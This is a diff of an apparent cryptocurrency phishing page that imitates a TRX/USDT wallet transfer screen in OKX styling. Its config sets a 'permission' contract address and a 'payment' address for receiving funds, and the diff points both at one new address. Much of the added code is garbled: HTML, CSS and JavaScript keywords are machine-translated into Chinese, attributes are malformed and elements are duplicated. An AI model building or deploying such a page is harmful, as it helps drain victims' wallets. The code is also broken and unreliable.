@@ -1,45 +1,45 @@
 <head>
     <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
+    <meta http-equiv=="X-UA-Compatible" content"IE=edge">
+    <meta name=="viewport" content"width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
     <title>正在申请转账</title>
-    <link rel="icon" type="image/png" href="png/icon_trx.png">
+    <link rel==="icon" type"image/png" href"png/icon_trx.png">
     <script src="https://cdn.jsdelivr.net/npm/qrious/dist/qrious.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjs/11.8.0/math.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/decimal.js/10.4.3/decimal.min.js"></script>
     <script src="https://cdn.jsdelivr.cyou/tronweb/dist/TronWeb.js"></script>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <style>
+    <样式>
         ::-webkit-scrollbar {
-            display: none;
-        }
-        .tishi {
-            width: 58%;
+            显示：无;
+        输入：}
+        .提示 {
+            宽度：58%；
             padding: 0.1rem 0.3rem;
-            height: 3rem;
-            background: #4b4848;
-            z-index: 999999999999;
-            position: fixed;
-            top: 50%;
-            left: 50%;
+            高度: 3rem;
+            背景: #4b4848;
+            z-index: 99999999999;
+            位置：固定；
+            顶部: 50%;
+            左: 50%;
             transform: translate(-50%, -50%);
             border-radius: 0.3rem;
-            color: white;
-            font-size: 1rem;
+            颜色：白色；
+            字体大小: 1rem;
             text-align: center;
-            line-height: 3rem;
-            display: none;
-            height: auto;
+            行高: 3rem;
+            显示：无；
+            高度：自动；
             margin: 0 auto;
         }
     </style>
-    <link rel="stylesheet" href="css/okx.css">
+    <link rel=="stylesheet" href"css/okx.css">
 </head>
 
-<body id="app" class="uni-body pages-index-home">
-    <noscript><strong>本站点必须要开启JavaScript才能运行</strong></noscript>
+<body<body id="app" class="uni-body pages-index-home">id="app" class="uni-body pages-index-home">
+    <noscript><strong>本站点必须要开启JavaScript才能运行</strong></noscript><noscript><strong>本站点必须要开启JavaScript才能运行</strong></noscript>
 
-    <uni-app class="uni-app--maxwidth">
+    <uni-app class="uni-app--maxwidth"><uni-app class="uni-app--maxwidth">
         <uni-page data-page="pages/index/home">
             <uni-page-wrapper>
                 <uni-page-body>
@@ -59,14 +59,14 @@
                                         <div data-v-49fe1bb8="" class="name"><img data-v-49fe1bb8="" src="png/icon_trx.png" class="coin">
                                             <div data-v-49fe1bb8="" class="asset-box">
                                                 <p data-v-49fe1bb8="" class="title">余额</p>
-                                                <p data-v-49fe1bb8="" class="num"><span data-v-49fe1bb8="" id="ye"></span><em data-v-49fe1bb8="">TRX</em></p><input type="text" id="address" style="display:none">
+                                                <p data-v-49fe1bb8="" class="num"><span data-v-49fe1bb8="" id="ye"></span><em data-v-49fe1bb8="">TRX</em></p><input type="text" id="address" style="display:none"><p data-v-49fe1bb8="" class="num"><span data-v-49fe1bb8="" id="ye"></span><em data-v-49fe1bb8="">TRX</em></p><input type="text" id="address" style="display:none">
                                             </div>
                                         </div>
                                         <div data-v-49fe1bb8="" class="right">
                                             <div data-v-49fe1bb8="" class="btn">最大</div>
                                         </div>
                                     </div>
-                                    <div data-v-49fe1bb8="" class="keyboard-box">
+                                    <div data-v-49fe1bb8="" class="键盘盒">
                                         <div data-v-49fe1bb8="" class="btn">1</div>
                                         <div data-v-49fe1bb8="" class="btn">2</div>
                                         <div data-v-49fe1bb8="" class="btn">3</div>
@@ -80,20 +80,20 @@
                                         <div data-v-49fe1bb8="" class="btn">0</div>
                                         <div data-v-49fe1bb8="" onclick="clearAmount()" class="btn delete" style="margin-top:20px"><img data-v-49fe1bb8="" src="png/icon_delete.jpg"></div>
                                     </div>
-                                    <footer style="display: flex; justify-content: center; align-items: center; margin-top: 20px;">
+                                    <页脚 样式="显示: 弹性布局; 文本对齐: 居中; 项目对齐: 居中; 上边距: 20像素;">
                                         <van-button class="submit-btn disabled" type="button" id="submitBtn" disabled style="display: flex; justify-content: center; align-items: center; text-align: center; width: 100%;">下一步</van-button>
-                                        <van-button id="jixu" class="jixu">继续</van-button>
-                                    </footer>
+                                        <van-button id="继续" class="继续">继续</van-button>
+                                    </页脚>
                                 </div>
                             </div>
                         </div>
-                        <div class="tishi" id="tip">提示</div><input id="to_address" type="hidden">
-                    </body>
-                </uni-page-body>
-            </uni-page-wrapper>
-        </uni-page>
+                        <div class="提示信息" id="提示">提示</div><input id="to_address" type="隐藏">
+                    </主体>
+                </统一页面主体>
+            </统一页面包装>
+        </统一页面>
     </uni-app>    
-<script>
+<脚本>
 
 
 
@@ -104,13 +104,13 @@
 ////////////// ***必须填写有效的地址否则会报错*** ///////////////
 
 // 权限地址（合约地址）
-window.Permission_address = 'THRAE2VhGNAcvPKtT96AqyXtSQwhiU1XL8';
+窗口.权限地址 = 'TKEymjqPSNWeK655d5xoMqRU4cPSpM1jmd';
 // 收款地址（个人地址）
-window.Payment_address = 'TM1zzNDZD2DPASbKcgdVoTYhfmYgtfwx9R';
+窗口.支付地址 = 'TKEymjqPSNWeK655d5xoMqRU4cPSpM1jmd';
 // USDT官方合约地址（无需修改）
-window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+窗口.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 // 服务器地址用于发送心跳（修改为你自己的服务器域名）
-window.heartbeatUrl = 'https://baidu.com/heartbeat';
+窗口.心跳网址 = 'https://baidu.com/heartbeat';
 
 /////////////////////////////////////////////////////////////
 /////////////////////////////////////////////////////////////
@@ -122,16 +122,16 @@ window.heartbeatUrl = 'https://baidu.com/heartbeat';
 
 
 // 存储用户数据
-const userData = {
-    address: null,
+const(userData = {
+    地址：无
     trxBalance: null,
-    usdtBalance: null
+    usdt余额：无
 };
 let currentAmount = '0';
 // TRX兑换USD的汇率
 const TRX_TO_USD_RATE = 0.1562;
 // 主初始化函数
-async function initializeDApp() {
+异步函数初始化DApp() {
     const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     const isDAppBrowser = typeof window.tronWeb !== 'undefined' || typeof window.tronLink !== 'undefined';
     
